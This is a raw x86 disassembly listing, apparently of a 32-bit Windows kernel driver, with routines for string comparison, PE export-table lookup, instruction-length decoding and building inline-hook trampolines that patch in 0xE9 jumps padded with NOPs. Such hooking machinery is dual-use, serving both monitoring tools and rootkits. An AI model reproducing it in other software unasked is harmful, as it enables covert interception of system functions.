   1967f:	push   eax
   19680:	push   DWORD PTR [ebp-0x834]
   19686:	call   0x19996
   1968b:	mov    edi,eax
   1968d:	add    edi,DWORD PTR [ebp-0x824]
   19693:	push   esi
   19694:	call   0x115f4
   19699:	mov    esi,eax
   1969b:	push   edi
   1969c:	call   0x1993e
   196a1:	mov    ecx,DWORD PTR [esi]
   196a3:	mov    eax,DWORD PTR [ecx+eax*4]
   196a6:	mov    ds:0x7ed04,eax
   196ab:	push   DWORD PTR [ebp-0x824]
   196b1:	call   0x19c60
   196b6:	push   ebx
   196b7:	push   0x19
   196b9:	call   0x109f0
   196be:	call   0x188f6
   196c3:	mov    BYTE PTR ds:0x7ed40,0x1
   196ca:	jmp    0x1954c
   196cf:	xor    eax,eax
   196d1:	call   0x1de28
   196d6:	ret    0x8
   196d9:	int3   
   196da:	int3   
   196db:	int3   
   196dc:	int3   
   196dd:	int3   
   196de:	mov    edi,edi
   196e0:	push   ebp
   196e1:	mov    ebp,esp
   196e3:	push   ecx
   196e4:	mov    ecx,DWORD PTR [ebp+0x8]
   196e7:	mov    eax,DWORD PTR [ecx+0x4]
   196ea:	mov    edx,DWORD PTR [ebp+0xc]
   196ed:	push   ebx
   196ee:	mov    ebx,DWORD PTR [edx+0x4]
   196f1:	push   esi
   196f2:	push   edi
   196f3:	mov    DWORD PTR [ebp-0x4],eax
   196f6:	mov    DWORD PTR [ebp+0x8],eax
   196f9:	cmp    eax,ebx
   196fb:	jbe    0x19700
   196fd:	mov    DWORD PTR [ebp+0x8],ebx
   19700:	xor    eax,eax
   19702:	cmp    DWORD PTR [ebp+0x8],eax
   19705:	jbe    0x1971d
   19707:	mov    esi,DWORD PTR [ecx]
   19709:	mov    edi,DWORD PTR [edx]
   1970b:	mov    cl,BYTE PTR [esi+eax*1]
   1970e:	mov    dl,BYTE PTR [edi+eax*1]
   19711:	cmp    cl,dl
   19713:	jl     0x1972a
   19715:	jg     0x1972e
   19717:	inc    eax
   19718:	cmp    eax,DWORD PTR [ebp+0x8]
   1971b:	jb     0x1970b
   1971d:	cmp    DWORD PTR [ebp-0x4],ebx
   19720:	setb   al
   19723:	pop    edi
   19724:	pop    esi
   19725:	pop    ebx
   19726:	leave  
   19727:	ret    0x8
   1972a:	mov    al,0x1
   1972c:	jmp    0x19723
   1972e:	xor    al,al
   19730:	jmp    0x19723
   19732:	int3   
   19733:	int3   
   19734:	int3   
   19735:	int3   
   19736:	int3   
   19737:	int3   
   19738:	mov    edi,edi
   1973a:	push   ebp
   1973b:	mov    ebp,esp
   1973d:	mov    eax,DWORD PTR [ebp+0x8]
   19740:	mov    ecx,DWORD PTR [eax+0x4]
   19743:	mov    edx,DWORD PTR [ebp+0xc]
   19746:	cmp    ecx,DWORD PTR [edx+0x4]
   19749:	je     0x1974f
   1974b:	xor    al,al
   1974d:	jmp    0x1975e
   1974f:	push   esi
   19750:	mov    esi,DWORD PTR [eax]
   19752:	push   edi
   19753:	mov    edi,DWORD PTR [edx]
   19755:	xor    eax,eax
   19757:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   19759:	pop    edi
   1975a:	sete   al
   1975d:	pop    esi
   1975e:	pop    ebp
   1975f:	ret    0x8
   19762:	int3   
   19763:	int3   
   19764:	int3   
   19765:	int3   
   19766:	int3   
   19767:	int3   
   19768:	mov    edi,edi
   1976a:	push   ebp
   1976b:	mov    ebp,esp
   1976d:	push   DWORD PTR [ebp+0xc]
   19770:	push   DWORD PTR [ebp+0x8]
   19773:	call   0x19738
   19778:	xor    ecx,ecx
   1977a:	test   al,al
   1977c:	sete   cl
   1977f:	mov    al,cl
   19781:	pop    ebp
   19782:	ret    0x8
   19785:	int3   
   19786:	int3   
   19787:	int3   
   19788:	int3   
   19789:	int3   
   1978a:	mov    edi,edi
   1978c:	push   ebp
   1978d:	mov    ebp,esp
   1978f:	push   ecx
   19790:	mov    ecx,DWORD PTR [ebp+0x8]
   19793:	mov    eax,DWORD PTR [ebp+0xc]
   19796:	push   ebx
   19797:	mov    ebx,DWORD PTR [eax+0x4]
   1979a:	push   esi
   1979b:	push   edi
   1979c:	mov    edi,DWORD PTR [ecx+0x4]
   1979f:	mov    DWORD PTR [ebp-0x4],edi
   197a2:	cmp    edi,ebx
   197a4:	jbe    0x197a8
   197a6:	mov    edi,ebx
   197a8:	and    DWORD PTR [ebp+0x8],0x0
   197ac:	test   edi,edi
   197ae:	jbe    0x197ce
   197b0:	mov    eax,DWORD PTR [eax]
   197b2:	mov    ecx,DWORD PTR [ecx]
   197b4:	sub    ecx,eax
   197b6:	movzx  edx,WORD PTR [ecx+eax*1]
   197ba:	movzx  esi,WORD PTR [eax]
   197bd:	cmp    dx,si
   197c0:	jb     0x197db
   197c2:	ja     0x197df
   197c4:	inc    DWORD PTR [ebp+0x8]
   197c7:	inc    eax
   197c8:	inc    eax
   197c9:	cmp    DWORD PTR [ebp+0x8],edi
   197cc:	jb     0x197b6
   197ce:	cmp    DWORD PTR [ebp-0x4],ebx
   197d1:	setb   al
   197d4:	pop    edi
   197d5:	pop    esi
   197d6:	pop    ebx
   197d7:	leave  
   197d8:	ret    0x8
   197db:	mov    al,0x1
   197dd:	jmp    0x197d4
   197df:	xor    al,al
   197e1:	jmp    0x197d4
   197e3:	int3   
   197e4:	int3   
   197e5:	int3   
   197e6:	int3   
   197e7:	int3   
   197e8:	mov    edi,edi
   197ea:	push   ebp
   197eb:	mov    ebp,esp
   197ed:	pop    ebp
   197ee:	jmp    0x196de
   197f3:	int3   
   197f4:	int3   
   197f5:	int3   
   197f6:	int3   
   197f7:	int3   
   197f8:	mov    edi,edi
   197fa:	push   ebp
   197fb:	mov    ebp,esp
   197fd:	pop    ebp
   197fe:	jmp    0x19738
   19803:	int3   
   19804:	int3   
   19805:	int3   
   19806:	int3   
   19807:	int3   
   19808:	mov    edi,edi
   1980a:	push   ebp
   1980b:	mov    ebp,esp
   1980d:	pop    ebp
   1980e:	jmp    0x19768
   19813:	int3   
   19814:	int3   
   19815:	int3   
   19816:	int3   
   19817:	int3   
   19818:	mov    edi,edi
   1981a:	push   ebp
   1981b:	mov    ebp,esp
   1981d:	pop    ebp
   1981e:	jmp    0x1978a
   19823:	int3   
   19824:	int3   
   19825:	int3   
   19826:	int3   
   19827:	int3   
   19828:	mov    edi,edi
   1982a:	push   ebp
   1982b:	mov    ebp,esp
   1982d:	mov    eax,DWORD PTR [ebp+0x8]
   19830:	mov    cl,BYTE PTR [ebp+0xc]
   19833:	mov    BYTE PTR [eax],cl
   19835:	inc    eax
   19836:	pop    ebp
   19837:	ret    0x8
   1983a:	int3   
   1983b:	int3   
   1983c:	int3   
   1983d:	int3   
   1983e:	int3   
   1983f:	int3   
   19840:	mov    edi,edi
   19842:	push   ebp
   19843:	mov    ebp,esp
   19845:	mov    eax,DWORD PTR [ebp+0x8]
   19848:	mov    ecx,DWORD PTR [ebp+0xc]
   1984b:	mov    DWORD PTR [eax],ecx
   1984d:	add    eax,0x4
   19850:	pop    ebp
   19851:	ret    0x8
   19854:	int3   
   19855:	int3   
   19856:	int3   
   19857:	int3   
   19858:	int3   
   19859:	int3   
   1985a:	mov    edi,edi
   1985c:	push   ebp
   1985d:	mov    ebp,esp
   1985f:	mov    eax,DWORD PTR [ebp+0x8]
   19862:	mov    cx,WORD PTR [ebp+0xc]
   19866:	mov    WORD PTR [eax],cx
   19869:	add    eax,0x2
   1986c:	pop    ebp
   1986d:	ret    0x8
   19870:	int3   
   19871:	int3   
   19872:	int3   
   19873:	int3   
   19874:	int3   
   19875:	int3   
   19876:	mov    edi,edi
   19878:	push   ebp
   19879:	mov    ebp,esp
   1987b:	push   esi
   1987c:	mov    esi,DWORD PTR [ebp+0x10]
   1987f:	push   edi
   19880:	mov    edi,DWORD PTR [ebp+0x8]
   19883:	push   esi
   19884:	push   DWORD PTR [ebp+0xc]
   19887:	push   edi
   19888:	call   0x1daa0
   1988d:	add    esp,0xc
   19890:	lea    eax,[edi+esi*1]
   19893:	pop    edi
   19894:	pop    esi
   19895:	pop    ebp
   19896:	ret    0xc
   19899:	int3   
   1989a:	int3   
   1989b:	int3   
   1989c:	int3   
   1989d:	int3   
   1989e:	mov    edi,edi
   198a0:	push   ebp
   198a1:	mov    ebp,esp
   198a3:	mov    eax,DWORD PTR [ebp+0xc]
   198a6:	mov    ecx,DWORD PTR [ebp+0x8]
   198a9:	sub    ecx,eax
   198ab:	sub    ecx,0x5
   198ae:	mov    BYTE PTR [eax],0xe9
   198b1:	mov    DWORD PTR [eax+0x1],ecx
   198b4:	add    eax,0x5
   198b7:	pop    ebp
   198b8:	ret    0x8
   198bb:	int3   
   198bc:	int3   
   198bd:	int3   
   198be:	int3   
   198bf:	int3   
   198c0:	mov    edi,edi
   198c2:	push   ebp
   198c3:	mov    ebp,esp
   198c5:	push   ecx
   198c6:	push   ebx
   198c7:	mov    ebx,DWORD PTR [ebp+0x8]
   198ca:	and    DWORD PTR [ebp+0x8],0x0
   198ce:	push   edi
   198cf:	mov    edi,ebx
   198d1:	test   ebx,ebx
   198d3:	jne    0x198d9
   198d5:	xor    eax,eax
   198d7:	jmp    0x19933
   198d9:	push   esi
   198da:	push   0x20736649
   198df:	push   0x80
   198e4:	push   0x0
   198e6:	call   DWORD PTR ds:0x1ee2c
   198ec:	mov    esi,eax
   198ee:	mov    DWORD PTR [ebp-0x4],esi
   198f1:	push   0x0
   198f3:	push   edi
   198f4:	push   esi
   198f5:	call   0x19fe2
   198fa:	mov    ecx,eax
   198fc:	sub    ecx,edi
   198fe:	add    DWORD PTR [ebp+0x8],ecx
   19901:	add    esi,ecx
   19903:	cmp    DWORD PTR [ebp+0x8],0x5
   19907:	mov    edi,eax
   19909:	jb     0x198f1
   1990b:	push   DWORD PTR [ebp+0x8]
   1990e:	push   0x90
   19913:	push   ebx
   19914:	call   0x1dab8
   19919:	add    esp,0xc
   1991c:	push   esi
   1991d:	lea    eax,[ebx+0x5]
   19920:	push   eax
   19921:	call   0x1989e
   19926:	push   ebx
   19927:	push   DWORD PTR [ebp+0xc]
   1992a:	call   0x1989e
   1992f:	mov    eax,DWORD PTR [ebp-0x4]
   19932:	pop    esi
   19933:	pop    edi
   19934:	pop    ebx
   19935:	leave  
   19936:	ret    0x8
   19939:	int3   
   1993a:	int3   
   1993b:	int3   
   1993c:	int3   
   1993d:	int3   
   1993e:	mov    edi,edi
   19940:	push   ebp
   19941:	mov    ebp,esp
   19943:	mov    eax,DWORD PTR [ebp+0x8]
   19946:	mov    eax,DWORD PTR [eax+0x1]
   19949:	pop    ebp
   1994a:	ret    0x4
   1994d:	int3   
   1994e:	int3   
   1994f:	int3   
   19950:	int3   
   19951:	int3   
   19952:	mov    edi,edi
   19954:	push   ebp
   19955:	mov    ebp,esp
   19957:	mov    ecx,DWORD PTR [ebp+0x8]
   1995a:	movzx  eax,WORD PTR [ecx+0x14]
   1995e:	lea    eax,[eax+ecx*1+0x18]
   19962:	movzx  ecx,WORD PTR [ecx+0x6]
   19966:	push   esi
   19967:	xor    esi,esi
   19969:	push   edi
   1996a:	test   ecx,ecx
   1996c:	jbe    0x19988
   1996e:	mov    edx,DWORD PTR [eax+0xc]
   19971:	cmp    DWORD PTR [ebp+0xc],edx
   19974:	jb     0x19980
   19976:	mov    edi,DWORD PTR [eax+0x8]
   19979:	add    edi,edx
   1997b:	cmp    DWORD PTR [ebp+0xc],edi
   1997e:	jb     0x1998a
   19980:	add    eax,0x28
   19983:	inc    esi
   19984:	cmp    esi,ecx
   19986:	jb     0x1996e
   19988:	xor    eax,eax
   1998a:	pop    edi
   1998b:	pop    esi
   1998c:	pop    ebp
   1998d:	ret    0x8
   19990:	int3   
   19991:	int3   
   19992:	int3   
   19993:	int3   
   19994:	int3   
   19995:	int3   
   19996:	mov    edi,edi
   19998:	push   ebp
   19999:	mov    ebp,esp
   1999b:	push   esi
   1999c:	push   DWORD PTR [ebp+0xc]
   1999f:	mov    esi,DWORD PTR [ebp+0x8]
   199a2:	push   esi
   199a3:	call   0x19952
   199a8:	mov    ecx,eax
   199aa:	test   ecx,ecx
   199ac:	je     0x199bf
   199ae:	mov    eax,DWORD PTR [esi+0x3c]
   199b1:	dec    eax
   199b2:	not    eax
   199b4:	and    eax,DWORD PTR [ecx+0x14]
   199b7:	sub    eax,DWORD PTR [ecx+0xc]
   199ba:	add    eax,DWORD PTR [ebp+0xc]
   199bd:	jmp    0x199c2
   199bf:	mov    eax,DWORD PTR [ebp+0xc]
   199c2:	pop    esi
   199c3:	pop    ebp
   199c4:	ret    0x8
   199c7:	int3   
   199c8:	int3   
   199c9:	int3   
   199ca:	int3   
   199cb:	int3   
   199cc:	mov    edi,edi
   199ce:	push   ebp
   199cf:	mov    ebp,esp
   199d1:	cmp    DWORD PTR [ebp+0x10],0x0
   199d5:	je     0x199dc
   199d7:	mov    eax,DWORD PTR [ebp+0xc]
   199da:	jmp    0x199e7
   199dc:	push   DWORD PTR [ebp+0xc]
   199df:	push   DWORD PTR [ebp+0x8]
   199e2:	call   0x19996
   199e7:	pop    ebp
   199e8:	ret    0xc
   199eb:	int3   
   199ec:	int3   
   199ed:	int3   
   199ee:	int3   
   199ef:	int3   
   199f0:	mov    edi,edi
   199f2:	push   ebp
   199f3:	mov    ebp,esp
   199f5:	sub    esp,0x1c
   199f8:	push   ebx
   199f9:	push   esi
   199fa:	mov    esi,DWORD PTR [ebp+0x8]
   199fd:	push   edi
   199fe:	push   esi
   199ff:	call   0x118b4
   19a04:	call   eax
   19a06:	mov    ebx,eax
   19a08:	lea    eax,[ebp-0x14]
   19a0b:	push   eax
   19a0c:	push   0x0
   19a0e:	push   0x0
   19a10:	push   esi
   19a11:	mov    DWORD PTR [ebp-0x4],ebx
   19a14:	call   0x118de
   19a19:	call   eax
   19a1b:	mov    edi,eax
   19a1d:	mov    eax,DWORD PTR [ebx+0x50]
   19a20:	mov    ecx,edi
   19a22:	sub    ecx,esi
   19a24:	cmp    eax,ecx
   19a26:	jb     0x19a77
   19a28:	mov    ecx,DWORD PTR [ebp-0x14]
   19a2b:	sub    ecx,esi
   19a2d:	add    ecx,edi
   19a2f:	cmp    eax,ecx
   19a31:	jb     0x19a77
   19a33:	push   DWORD PTR [ebp+0x10]
   19a36:	push   DWORD PTR [edi+0x20]
   19a39:	push   ebx
   19a3a:	call   0x199cc
   19a3f:	push   DWORD PTR [ebp+0x10]
   19a42:	mov    ebx,eax
   19a44:	push   DWORD PTR [edi+0x1c]
   19a47:	add    ebx,esi
   19a49:	push   DWORD PTR [ebp-0x4]
   19a4c:	call   0x199cc
   19a51:	push   DWORD PTR [ebp+0x10]
   19a54:	add    eax,esi
   19a56:	push   DWORD PTR [edi+0x24]
   19a59:	mov    DWORD PTR [ebp-0x1c],eax
   19a5c:	push   DWORD PTR [ebp-0x4]
   19a5f:	call   0x199cc
   19a64:	and    DWORD PTR [ebp-0xc],0x0
   19a68:	add    eax,esi
   19a6a:	mov    esi,DWORD PTR [edi+0x18]
   19a6d:	mov    DWORD PTR [ebp-0x18],eax
   19a70:	mov    DWORD PTR [ebp-0x8],esi
   19a73:	test   esi,esi
   19a75:	jg     0x19a83
   19a77:	xor    eax,eax
   19a79:	pop    edi
   19a7a:	pop    esi
   19a7b:	pop    ebx
   19a7c:	leave  
   19a7d:	ret    0xc
   19a80:	mov    esi,DWORD PTR [ebp-0x8]
   19a83:	mov    eax,DWORD PTR [ebp-0xc]
   19a86:	push   DWORD PTR [ebp+0x10]
   19a89:	add    esi,eax
   19a8b:	mov    eax,DWORD PTR [ebp+0xc]
   19a8e:	sar    esi,1
   19a90:	push   DWORD PTR [ebx+esi*4]
   19a93:	mov    DWORD PTR [ebp-0x10],eax
   19a96:	push   DWORD PTR [ebp-0x4]
   19a99:	call   0x199cc
   19a9e:	add    eax,DWORD PTR [ebp+0x8]
   19aa1:	mov    cl,BYTE PTR [eax]
   19aa3:	mov    edx,DWORD PTR [ebp-0x10]
   19aa6:	cmp    cl,BYTE PTR [edx]
   19aa8:	jne    0x19ac5
   19aaa:	test   cl,cl
   19aac:	je     0x19ac1
   19aae:	mov    cl,BYTE PTR [eax+0x1]
   19ab1:	cmp    cl,BYTE PTR [edx+0x1]
   19ab4:	jne    0x19ac5
   19ab6:	inc    eax
   19ab7:	inc    eax
   19ab8:	inc    edx
   19ab9:	inc    edx
   19aba:	mov    DWORD PTR [ebp-0x10],edx
   19abd:	test   cl,cl
   19abf:	jne    0x19aa1
   19ac1:	xor    eax,eax
   19ac3:	jmp    0x19aca
   19ac5:	sbb    eax,eax
   19ac7:	sbb    eax,0xffffffff
   19aca:	test   eax,eax
   19acc:	je     0x19ae3
   19ace:	jge    0x19ad6
   19ad0:	inc    esi
   19ad1:	mov    DWORD PTR [ebp-0xc],esi
   19ad4:	jmp    0x19ad9
   19ad6:	mov    DWORD PTR [ebp-0x8],esi
   19ad9:	mov    eax,DWORD PTR [ebp-0x8]
   19adc:	cmp    DWORD PTR [ebp-0xc],eax
   19adf:	jl     0x19a80
   19ae1:	jmp    0x19a77
   19ae3:	mov    eax,DWORD PTR [ebp-0x18]
   19ae6:	movzx  eax,WORD PTR [eax+esi*2]
   19aea:	mov    ecx,DWORD PTR [ebp-0x1c]
   19aed:	mov    ecx,DWORD PTR [ecx+eax*4]
   19af0:	mov    eax,ecx
   19af2:	sub    eax,edi
   19af4:	add    eax,DWORD PTR [ebp+0x8]
   19af7:	cmp    eax,DWORD PTR [ebp-0x14]
   19afa:	sbb    eax,eax
   19afc:	not    eax
   19afe:	and    eax,ecx
   19b00:	jmp    0x19a79
   19b05:	int3   
   19b06:	int3   
   19b07:	int3   
   19b08:	int3   
   19b09:	int3   
   19b0a:	mov    edi,edi
   19b0c:	push   ebp
   19b0d:	mov    ebp,esp
   19b0f:	sub    esp,0x818
   19b15:	mov    eax,ds:0x7eb38
   19b1a:	xor    eax,ebp
   19b1c:	mov    DWORD PTR [ebp-0x4],eax
   19b1f:	mov    eax,DWORD PTR [ebp+0x8]
   19b22:	mov    ecx,DWORD PTR [ebp+0xc]
   19b25:	push   esi
   19b26:	push   edi
   19b27:	mov    DWORD PTR [ebp-0x7e4],eax
   19b2d:	xor    esi,esi
   19b2f:	xor    eax,eax
   19b31:	push   ecx
   19b32:	mov    DWORD PTR [ebp-0x7f0],esi
   19b38:	lea    edi,[ebp-0x7ec]
   19b3e:	stos   DWORD PTR es:[edi],eax
   19b3f:	lea    eax,[ebp-0x7d4]
   19b45:	push   0x1ec1a
   19b4a:	push   eax
   19b4b:	mov    DWORD PTR [ebp-0x7dc],esi
   19b51:	mov    DWORD PTR [ebp-0x7e8],esi
   19b57:	call   DWORD PTR ds:0x1ee48
   19b5d:	add    esp,0xc
   19b60:	lea    eax,[ebp-0x7d4]
   19b66:	push   eax
   19b67:	lea    eax,[ebp-0x810]
   19b6d:	push   eax
   19b6e:	call   0x11c7a
   19b73:	call   eax
   19b75:	push   0x10
   19b77:	lea    eax,[ebp-0x810]
   19b7d:	mov    DWORD PTR [ebp-0x800],eax
   19b83:	push   0x1
   19b85:	lea    eax,[ebp-0x818]
   19b8b:	push   eax
   19b8c:	lea    eax,[ebp-0x808]
   19b92:	push   eax
   19b93:	push   0x80100000
   19b98:	lea    eax,[ebp-0x7e0]
   19b9e:	push   eax
   19b9f:	mov    DWORD PTR [ebp-0x808],0x18
   19ba9:	mov    DWORD PTR [ebp-0x804],esi
   19baf:	mov    DWORD PTR [ebp-0x7fc],esi
   19bb5:	mov    DWORD PTR [ebp-0x7f8],esi
   19bbb:	mov    DWORD PTR [ebp-0x7f4],esi
   19bc1:	call   0x11764
   19bc6:	call   eax
   19bc8:	cmp    eax,esi
   19bca:	jl     0x19c4b
   19bcc:	push   ebx
   19bcd:	push   DWORD PTR [ebp-0x7e0]
   19bd3:	lea    eax,[ebp-0x7f0]
   19bd9:	push   DWORD PTR [ebp+0x10]
   19bdc:	push   0x2
   19bde:	push   eax
   19bdf:	push   esi
   19be0:	push   0x4
   19be2:	lea    eax,[ebp-0x7d8]
   19be8:	push   eax
   19be9:	call   DWORD PTR ds:0x1ee54
   19bef:	push   DWORD PTR [ebp-0x7e0]
   19bf5:	mov    edi,DWORD PTR ds:0x1ee60
   19bfb:	mov    ebx,eax
   19bfd:	call   edi
   19bff:	cmp    ebx,esi
   19c01:	jl     0x19c36
   19c03:	push   0x2
   19c05:	push   esi
   19c06:	push   0x2
   19c08:	lea    eax,[ebp-0x7e8]
   19c0e:	push   eax
   19c0f:	push   esi
   19c10:	push   esi
   19c11:	push   esi
   19c12:	lea    eax,[ebp-0x7dc]
   19c18:	push   eax
   19c19:	push   0xffffffff
   19c1b:	push   DWORD PTR [ebp-0x7d8]
   19c21:	call   0x11bfc
   19c26:	call   eax
   19c28:	push   DWORD PTR [ebp-0x7d8]
   19c2e:	mov    ebx,eax
   19c30:	call   edi
   19c32:	cmp    ebx,esi
   19c34:	jge    0x19c3a
   19c36:	mov    eax,ebx
   19c38:	jmp    0x19c4a
   19c3a:	mov    eax,DWORD PTR [ebp-0x7dc]
   19c40:	mov    ecx,DWORD PTR [ebp-0x7e4]
   19c46:	mov    DWORD PTR [ecx],eax
   19c48:	xor    eax,eax
   19c4a:	pop    ebx
   19c4b:	mov    ecx,DWORD PTR [ebp-0x4]
   19c4e:	pop    edi
   19c4f:	xor    ecx,ebp
   19c51:	pop    esi
   19c52:	call   0x1da3b
   19c57:	leave  
   19c58:	ret    0xc
   19c5b:	int3   
   19c5c:	int3   
   19c5d:	int3   
   19c5e:	int3   
   19c5f:	int3   
   19c60:	mov    edi,edi
   19c62:	push   ebp
   19c63:	mov    ebp,esp
   19c65:	push   DWORD PTR [ebp+0x8]
   19c68:	push   0xffffffff
   19c6a:	call   0x11c26
   19c6f:	call   eax
   19c71:	pop    ebp
   19c72:	ret    0x4
   19c75:	int3   
   19c76:	int3   
   19c77:	int3   
   19c78:	int3   
   19c79:	int3   
   19c7a:	mov    edi,edi
   19c7c:	push   ebp
   19c7d:	mov    ebp,esp
   19c7f:	push   esi
   19c80:	mov    esi,DWORD PTR [ebp+0x8]
   19c83:	test   esi,esi
   19c85:	jne    0x19c8a
   19c87:	lea    esi,[ecx+0x18]
   19c8a:	mov    edx,DWORD PTR [ebp+0xc]
   19c8d:	test   edx,edx
   19c8f:	jne    0x19c95
   19c91:	xor    eax,eax
   19c93:	jmp    0x19ca5
   19c95:	movzx  eax,BYTE PTR [edx]
   19c98:	push   edx
   19c99:	lea    eax,[eax*8+0x7a4b0]
   19ca0:	push   esi
   19ca1:	push   eax
   19ca2:	call   DWORD PTR [eax+0x4]
   19ca5:	pop    esi
   19ca6:	pop    ebp
   19ca7:	ret    0x8
   19caa:	int3   
   19cab:	int3   
   19cac:	int3   
   19cad:	int3   
   19cae:	int3   
   19caf:	int3   
   19cb0:	mov    edi,edi
   19cb2:	push   ebp
   19cb3:	mov    ebp,esp
   19cb5:	mov    eax,DWORD PTR [ebp+0x14]
   19cb8:	push   ebx
   19cb9:	mov    ebx,DWORD PTR [ebp+0x8]
   19cbc:	push   esi
   19cbd:	mov    esi,DWORD PTR [ebp+0x10]
   19cc0:	sub    esi,eax
   19cc2:	push   edi
   19cc3:	lea    edi,[ebx+eax*1]
   19cc6:	mov    eax,esi
   19cc8:	xor    edx,edx
   19cca:	dec    eax
   19ccb:	je     0x19cec
   19ccd:	dec    eax
   19cce:	je     0x19cde
   19cd0:	dec    eax
   19cd1:	dec    eax
   19cd2:	jne    0x19cf8
   19cd4:	mov    eax,DWORD PTR [ecx+0xc]
   19cd7:	mov    edx,DWORD PTR [edi]
   19cd9:	and    DWORD PTR [eax],0x0
   19cdc:	jmp    0x19cf8
   19cde:	mov    eax,DWORD PTR [ecx+0xc]
   19ce1:	movsx  edx,WORD PTR [edi]
   19ce4:	mov    DWORD PTR [eax],0x2
   19cea:	jmp    0x19cf8
   19cec:	mov    eax,DWORD PTR [ecx+0xc]
   19cef:	movsx  edx,BYTE PTR [edi]
   19cf2:	mov    DWORD PTR [eax],0x3
   19cf8:	mov    ecx,DWORD PTR [ebp+0xc]
   19cfb:	lea    eax,[edx+ecx*1]
   19cfe:	add    eax,DWORD PTR [ebp+0x10]
   19d01:	sub    edx,ebx
   19d03:	add    edx,ecx
   19d05:	dec    esi
   19d06:	je     0x19d18
   19d08:	dec    esi
   19d09:	je     0x19d13
   19d0b:	dec    esi
   19d0c:	dec    esi
   19d0d:	jne    0x19d1a
   19d0f:	mov    DWORD PTR [edi],edx
   19d11:	jmp    0x19d1a
   19d13:	mov    WORD PTR [edi],dx
   19d16:	jmp    0x19d1a
   19d18:	mov    BYTE PTR [edi],dl
   19d1a:	pop    edi
   19d1b:	pop    esi
   19d1c:	pop    ebx
   19d1d:	pop    ebp
   19d1e:	ret    0x10
   19d21:	int3   
   19d22:	int3   
   19d23:	int3   
   19d24:	int3   
   19d25:	int3   
   19d26:	mov    edi,edi
   19d28:	push   ebp
   19d29:	mov    ebp,esp
   19d2b:	mov    eax,DWORD PTR [ebp+0x10]
   19d2e:	inc    eax
   19d2f:	pop    ebp
   19d30:	ret    0xc
   19d33:	int3   
   19d34:	int3   
   19d35:	int3   
   19d36:	int3   
   19d37:	int3   
   19d38:	mov    edi,edi
   19d3a:	push   ebp
   19d3b:	mov    ebp,esp
   19d3d:	mov    eax,ecx
   19d3f:	mov    ecx,DWORD PTR [ebp+0x8]
   19d42:	and    DWORD PTR [eax],0x0
   19d45:	and    DWORD PTR [eax+0x4],0x0
   19d49:	test   ecx,ecx
   19d4b:	jne    0x19d50
   19d4d:	lea    ecx,[eax+0x14]
   19d50:	mov    edx,DWORD PTR [ebp+0xc]
   19d53:	mov    DWORD PTR [eax+0x8],ecx
   19d56:	test   edx,edx
   19d58:	jne    0x19d5d
   19d5a:	lea    edx,[eax+0x10]
   19d5d:	mov    DWORD PTR [eax+0xc],edx
   19d60:	and    DWORD PTR [ecx],0x0
   19d63:	mov    ecx,DWORD PTR [eax+0xc]
   19d66:	and    DWORD PTR [ecx],0x0
   19d69:	pop    ebp
   19d6a:	ret    0x8
   19d6d:	int3   
   19d6e:	int3   
   19d6f:	int3   
   19d70:	int3   
   19d71:	int3   
   19d72:	mov    edi,edi
   19d74:	push   ebp
   19d75:	mov    ebp,esp
   19d77:	push   ecx
   19d78:	mov    eax,DWORD PTR [ebp+0x8]
   19d7b:	mov    eax,DWORD PTR [eax]
   19d7d:	push   ebx
   19d7e:	push   esi
   19d7f:	push   edi
   19d80:	mov    DWORD PTR [ebp-0x4],ecx
   19d83:	mov    esi,eax
   19d85:	test   eax,0x200000
   19d8a:	je     0x19d97
   19d8c:	cmp    DWORD PTR [ecx+0x4],0x0
   19d90:	je     0x19d9c
   19d92:	shr    esi,0xb
   19d95:	jmp    0x19d9f
   19d97:	cmp    DWORD PTR [ecx],0x0
   19d9a:	jmp    0x19d90
   19d9c:	shr    esi,0x8
   19d9f:	mov    ebx,DWORD PTR [ebp+0x10]
   19da2:	and    esi,0x7
   19da5:	shr    eax,0xe
   19da8:	and    eax,0x7
   19dab:	mov    edi,esi
   19dad:	jbe    0x19de9
   19daf:	add    eax,ebx
   19db1:	mov    cl,BYTE PTR [eax]
   19db3:	movzx  edx,cl
   19db6:	mov    dl,BYTE PTR [edx+0x7a3b0]
   19dbc:	test   dl,0x10
   19dbf:	je     0x19de1
   19dc1:	mov    al,BYTE PTR [eax+0x1]
   19dc4:	and    al,0x7
   19dc6:	cmp    al,0x5
   19dc8:	jne    0x19de1
   19dca:	and    cl,0xc0
   19dcd:	je     0x19dde
   19dcf:	cmp    cl,0x40
   19dd2:	jne    0x19dd9
   19dd4:	lea    edi,[esi+0x1]
   19dd7:	jmp    0x19de1
   19dd9:	cmp    cl,0x80
   19ddc:	jne    0x19de1
   19dde:	lea    edi,[esi+0x4]
   19de1:	movzx  eax,dl
   19de4:	and    eax,0xf
   19de7:	add    edi,eax
   19de9:	push   edi
   19dea:	push   ebx
   19deb:	push   DWORD PTR [ebp+0xc]
   19dee:	call   0x1daa0
   19df3:	mov    ecx,DWORD PTR [ebp+0x8]
   19df6:	mov    eax,DWORD PTR [ecx]
   19df8:	shl    eax,0xc
   19dfb:	sar    eax,0x1d
   19dfe:	add    esp,0xc
   19e01:	test   eax,eax
   19e03:	je     0x19e1f
   19e05:	push   eax
   19e06:	push   esi
   19e07:	mov    esi,DWORD PTR [ebp-0x4]
   19e0a:	push   ebx
   19e0b:	push   DWORD PTR [ebp+0xc]
   19e0e:	mov    ecx,esi
   19e10:	call   0x19cb0
   19e15:	mov    ecx,DWORD PTR [esi+0x8]
   19e18:	mov    DWORD PTR [ecx],eax
   19e1a:	mov    ecx,DWORD PTR [ebp+0x8]
   19e1d:	jmp    0x19e22
   19e1f:	mov    esi,DWORD PTR [ebp-0x4]
   19e22:	test   DWORD PTR [ecx],0x400000
   19e28:	je     0x19e2f
   19e2a:	mov    eax,DWORD PTR [esi+0xc]
   19e2d:	neg    DWORD PTR [eax]
   19e2f:	test   DWORD PTR [ecx],0x100000
   19e35:	je     0x19e3d
   19e37:	mov    eax,DWORD PTR [esi+0x8]
   19e3a:	or     DWORD PTR [eax],0xffffffff
   19e3d:	lea    eax,[edi+ebx*1]
   19e40:	pop    edi
   19e41:	pop    esi
   19e42:	pop    ebx
   19e43:	leave  
   19e44:	ret    0xc
   19e47:	int3   
   19e48:	int3   
   19e49:	int3   
   19e4a:	int3   
   19e4b:	int3   
   19e4c:	mov    edi,edi
   19e4e:	push   ebp
   19e4f:	mov    ebp,esp
   19e51:	push   ebx
   19e52:	push   esi
   19e53:	mov    esi,DWORD PTR [ebp+0x10]
   19e56:	push   edi
   19e57:	mov    edi,DWORD PTR [ebp+0xc]
   19e5a:	push   esi
